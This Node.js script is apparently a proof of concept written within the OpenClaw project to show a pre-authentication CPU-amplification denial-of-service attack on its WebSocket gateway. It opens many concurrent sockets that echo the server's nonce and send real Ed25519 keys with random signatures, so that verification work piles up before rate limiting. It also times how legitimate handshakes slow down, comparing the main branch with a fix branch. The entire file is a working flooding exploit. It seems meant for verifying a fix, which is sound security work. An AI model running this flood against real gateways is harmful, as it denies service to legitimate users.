#!/usr/bin/env node
// Pre-auth signature-verify CPU-amplification PoC against a running OpenClaw gateway.
//
// Opens N concurrent WebSocket connections that each send a handshake `connect`
// frame whose `device.publicKey` parses (real Ed25519 PEM) and whose
// `device.signature` is random garbage. The gateway is forced to run:
//   - deriveDeviceIdFromPublicKey  (createPublicKey #1)
//   - verifyDeviceSignature(v3)     (createPublicKey + crypto.verify)
//   - verifyDeviceSignature(v2)     (createPublicKey + crypto.verify)
// per attacker handshake, before any rate-limit gate fires on the device-only
// path.
//
// While the attack runs, a separate measurement client opens fresh WS
// connections sequentially and times the gateway's first response. The PoC
// reports the legit-handshake p50/p99 latency under baseline vs. under attack.
//
// Usage:
//   node scripts/poc-preauth-flood-ws.mjs \
//        --gateway ws://127.0.0.1:18789 \
//        --attackers 256 \
//        --legit-iters 50 \
//        --duration-ms 8000
//
// Notes:
//   - The gateway must be running: `pnpm gateway:watch` in another terminal.
//   - The legit-client handshake intentionally fails (device not paired) — we
//     measure server response latency, not auth success.
//   - Run against `origin/main` to observe the vulnerable path; switch to
//     `security/preauth-signature-rate-limit` to confirm the rate-limit gate
//     truncates attacker work.

import { createHash, generateKeyPairSync, randomBytes, randomUUID } from "node:crypto";
import { performance } from "node:perf_hooks";
import { WebSocket } from "ws";

const ED25519_SPKI_PREFIX = Buffer.from("302a300506032b6570032100", "hex");

// Mirror of src/infra/device-identity.ts: deviceId = sha256(raw 32-byte key).
function deriveAttackerDeviceId(publicKeyPem) {
  const base64 = publicKeyPem.replace(/-----[^-]+-----/g, "").replace(/\s+/g, "");
  const spki = Buffer.from(base64, "base64");
  const raw =
    spki.length === ED25519_SPKI_PREFIX.length + 32 &&
    spki.subarray(0, ED25519_SPKI_PREFIX.length).equals(ED25519_SPKI_PREFIX)
      ? spki.subarray(ED25519_SPKI_PREFIX.length)
      : spki;
  return createHash("sha256").update(raw).digest("hex");
}

function parseArgs(argv) {
  const args = {
    gateway: "ws://127.0.0.1:18789",
    attackers: 128,
    legitIters: 30,
    durationMs: 6000,
    legitSpacingMs: 50,
  };
  for (let i = 2; i < argv.length; i++) {
    const arg = argv[i];
    const [k, vInline] = arg.startsWith("--") ? arg.slice(2).split("=", 2) : [arg, undefined];
    const v = vInline ?? argv[++i];
    switch (k) {
      case "gateway":
        args.gateway = v;
        break;
      case "attackers":
        args.attackers = Number.parseInt(v, 10);
        break;
      case "legit-iters":
        args.legitIters = Number.parseInt(v, 10);
        break;
      case "duration-ms":
        args.durationMs = Number.parseInt(v, 10);
        break;
      case "legit-spacing-ms":
        args.legitSpacingMs = Number.parseInt(v, 10);
        break;
      default:
        console.error(`unknown arg: ${arg}`);
        process.exit(2);
    }
  }
  return args;
}

function quantile(sorted, q) {
  if (sorted.length === 0) {
    return Number.NaN;
  }
  const idx = Math.min(sorted.length - 1, Math.max(0, Math.floor(sorted.length * q)));
  return sorted[idx];
}

function summarize(samples) {
  const sorted = samples.toSorted((a, b) => a - b);
  return {
    n: sorted.length,
    min: sorted[0],
    p50: quantile(sorted, 0.5),
    p90: quantile(sorted, 0.9),
    p99: quantile(sorted, 0.99),
    max: sorted[sorted.length - 1],
    mean: sorted.reduce((s, v) => s + v, 0) / sorted.length,
  };
}

function makeRealPemKey() {
  const { publicKey } = generateKeyPairSync("ed25519");
  const exported = publicKey.export({ type: "spki", format: "pem" });
  return typeof exported === "string" ? exported : exported.toString("utf8");
}

function buildAttackerConnectFrame(publicKeyPem, deviceId, serverNonce) {
  // Random 64-byte signature: shape-valid for Ed25519 but verifies will fail.
  // The server-issued nonce is echoed back so the gateway reaches the
  // signature-verify path (a wrong nonce short-circuits before the verify).
  const sig = randomBytes(64).toString("base64url");
  return {
    type: "req",
    id: randomUUID(),
    method: "connect",
    params: {
      minProtocol: 1,
      maxProtocol: 3,
      client: {
        id: "openclaw-probe",
        version: "0.0.0-poc",
        platform: "poc",
        mode: "probe",
      },
      role: "operator",
      scopes: [],
      device: {
        id: deviceId,
        publicKey: publicKeyPem,
        signature: sig,
        signedAt: Date.now(),
        nonce: serverNonce,
      },
    },
  };
}

// Time-to-first-event measurement. The gateway sends a `connect.challenge`
// event immediately after WS upgrade. Under CPU pressure that first event
// is delayed (the gateway is busy doing crypto for attacker handshakes), so
// the legit-client probe latency is a direct read on gateway responsiveness
// without us having to complete a real handshake.
async function probeOnce(gatewayUrl) {
  const start = performance.now();
  return await new Promise((resolve) => {
    const ws = new WebSocket(gatewayUrl, {
      handshakeTimeout: 5000,
      // Origin header routes throttling through the gateway's
      // browser-origin rate limiter, which has exemptLoopback=false. Without
      // this the loopback-default-exempt rule masks the fix.
      headers: { Origin: "https://attacker.example" },
    });
    let settled = false;
    const finish = (outcome, err) => {
      if (settled) {
        return;
      }
      settled = true;
      const elapsed = performance.now() - start;
      try {
        ws.terminate();
      } catch {
        // ignore
      }
      resolve({ elapsedMs: elapsed, outcome, err: err?.message });
    };
    ws.once("message", () => finish("first-event"));
    ws.once("error", (err) => finish("error", err));
    ws.once("close", () => finish("close"));
  });
}

function spawnAttacker(gatewayUrl, attackerPemKey, attackerDeviceId, deadline, onMetrics) {
  let connectionCount = 0;
  let responseCount = 0;
  let openOk = 0;

  const loop = () => {
    if (performance.now() >= deadline) {
      onMetrics({ connectionCount, responseCount, openOk });
      return;
    }
    connectionCount++;
    const ws = new WebSocket(gatewayUrl, {
      handshakeTimeout: 5000,
      // Origin header routes throttling through the gateway's
      // browser-origin rate limiter, which has exemptLoopback=false. Without
      // this the loopback-default-exempt rule masks the fix.
      headers: { Origin: "https://attacker.example" },
    });
    let scheduled = false;
    let challengeSeen = false;
    const next = () => {
      if (scheduled) {
        return;
      }
      scheduled = true;
      try {
        ws.terminate();
      } catch {
        // ignore
      }
      // Reconnect immediately to keep the attacker socket pool full.
      setImmediate(loop);
    };
    ws.once("open", () => {
      openOk++;
    });
    ws.on("message", (raw) => {
      if (challengeSeen) {
        // Second message is the rejection res frame — done with this socket.
        responseCount++;
        next();
        return;
      }
      challengeSeen = true;
      const text = Buffer.isBuffer(raw)
        ? raw.toString("utf8")
        : Array.isArray(raw)
          ? Buffer.concat(raw).toString("utf8")
          : Buffer.from(raw).toString("utf8");
      let nonce;
      try {
        const event = JSON.parse(text);
        nonce = event?.payload?.nonce;
      } catch {
        next();
        return;
      }
      if (typeof nonce !== "string") {
        next();
        return;
      }
      try {
        ws.send(JSON.stringify(buildAttackerConnectFrame(attackerPemKey, attackerDeviceId, nonce)));
      } catch {
        next();
      }
    });
    ws.once("error", () => next());
    ws.once("close", () => next());
  };
  loop();
}

async function probeRound(gatewayUrl, iters, spacingMs) {
  const samples = [];
  const outcomes = new Map();
  for (let i = 0; i < iters; i++) {
    const result = await probeOnce(gatewayUrl);
    samples.push(result.elapsedMs);
    outcomes.set(result.outcome, (outcomes.get(result.outcome) ?? 0) + 1);
    if (spacingMs > 0) {
      await new Promise((r) => setTimeout(r, spacingMs));
    }
  }
  return { samples, outcomes };
}

async function main() {
  const args = parseArgs(process.argv);
  console.log(`gateway: ${args.gateway}`);
  console.log(
    `attackers=${args.attackers}, legit-iters=${args.legitIters}, duration=${args.durationMs}ms`,
  );

  // Sanity probe: make sure the gateway is reachable.
  const sanity = await probeOnce(args.gateway);
  console.log(
    `sanity: outcome=${sanity.outcome} elapsed=${sanity.elapsedMs.toFixed(2)}ms` +
      (sanity.err ? ` err=${sanity.err}` : ""),
  );
  if (sanity.outcome === "error" && sanity.err && sanity.err.includes("ECONNREFUSED")) {
    console.error("gateway not reachable. start it with `pnpm gateway:watch` first.");
    process.exit(1);
  }

  const attackerPem = makeRealPemKey();
  // Attacker reuses the same key/id across many connections — gateway derives
  // the same id every time, exercising the slow path identically. The id
  // must match deriveDeviceIdFromPublicKey(pem) or the gateway short-
  // circuits before the verify (device-id-mismatch path).
  const attackerDeviceId = deriveAttackerDeviceId(attackerPem);

  // --- baseline ---
  console.log("\n[1/2] measuring baseline legit-handshake latency...");
  const baseline = await probeRound(args.gateway, args.legitIters, args.legitSpacingMs);
  console.log(`baseline outcomes: ${formatOutcomes(baseline.outcomes)}`);
  console.log(`baseline: ${formatStats(summarize(baseline.samples))}`);

  // --- under attack ---
  console.log(`\n[2/2] launching ${args.attackers} attacker sockets for ${args.durationMs}ms...`);
  const deadline = performance.now() + args.durationMs;
  const attackerStats = [];
  for (let i = 0; i < args.attackers; i++) {
    spawnAttacker(args.gateway, attackerPem, attackerDeviceId, deadline, (m) =>
      attackerStats.push(m),
    );
  }
  // Give the attacker pool a moment to ramp up before measuring.
  await new Promise((r) => setTimeout(r, 500));
  const underAttack = await probeRound(args.gateway, args.legitIters, args.legitSpacingMs);
  // Wait for the attacker phase to finish.
  await new Promise((r) => setTimeout(r, Math.max(0, deadline - performance.now()) + 500));

  console.log(`under-attack outcomes: ${formatOutcomes(underAttack.outcomes)}`);
  console.log(`under-attack: ${formatStats(summarize(underAttack.samples))}`);

  const totalAttempts = attackerStats.reduce((s, m) => s + m.connectionCount, 0);
  const totalResponses = attackerStats.reduce((s, m) => s + m.responseCount, 0);
  console.log(
    `\nattacker totals: connections=${totalAttempts} server-responses=${totalResponses} ` +
      `(rate=${(totalAttempts / (args.durationMs / 1000)).toFixed(0)}/s over ${args.durationMs}ms)`,
  );

  const baseStats = summarize(baseline.samples);
  const attackStats = summarize(underAttack.samples);
  const ratio = attackStats.p50 / baseStats.p50;
  console.log(`\nlegit handshake p50 ratio (under-attack / baseline): ${ratio.toFixed(2)}x`);
  console.log(`legit handshake p99 ratio: ${(attackStats.p99 / baseStats.p99).toFixed(2)}x`);
}

function formatStats(s) {
  const fmt = (v) => (Number.isFinite(v) ? v.toFixed(2) : "n/a");
  return `n=${s.n} min=${fmt(s.min)}ms p50=${fmt(s.p50)}ms p90=${fmt(s.p90)}ms p99=${fmt(s.p99)}ms max=${fmt(s.max)}ms mean=${fmt(s.mean)}ms`;
}

function formatOutcomes(map) {
  return [...map.entries()].map(([k, v]) => `${k}=${v}`).join(",");
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
